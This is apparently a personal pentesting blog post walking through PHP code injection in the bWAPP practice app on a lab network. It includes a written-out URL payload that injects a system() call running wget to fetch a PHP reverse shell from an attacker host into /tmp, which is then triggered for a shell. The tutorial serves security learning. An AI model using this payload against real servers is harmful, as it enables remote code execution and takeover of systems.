---
layout: post
title: PHP Code Injection
categories:
  - Web-Pentesting
---

<br>PHP code injection is a vulnerability that allows an attacker to inject custom code into the server side scripting engine. This vulnerability occurs when an attacker can control all or part of an input string that is fed into an eval() function call. Eval will execute the argument as code.
<br>As you can see the message is showing in the URL, we can manipulate it

![37](https://teckk2.github.io/assets/images/Web%20Pentest/A1/37.png)
![38](https://teckk2.github.io/assets/images/Web%20Pentest/A1/38.png)
<br>Now how can we exploit this?
![39](https://teckk2.github.io/assets/images/Web%20Pentest/A1/39.png)
<br>Using the PHP system module, we can execute any system commands and get shell
<br>Now to get shell we cannot directly run nc or any one-liner, in alternate to that we can upload a php-reverse shell and execute it using this RCE.
<br>First host your php payload,
![40](https://teckk2.github.io/assets/images/Web%20Pentest/A1/40.png)
<br>Then download it into the victim’s machine
![41](https://teckk2.github.io/assets/images/Web%20Pentest/A1/41.png)
<br><font color="Black">192.168.140.138/bWAPP/phpi.php?message="a";system("wget http://192.168.140.136/teck-nc.php -O /tmp/teck.php")</font>

<br>Our file has been uploaded successfully now let’s try to trigger that file and get reverse shell.
![42](https://teckk2.github.io/assets/images/Web%20Pentest/A1/42.png)
<br>And we got the shell.

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
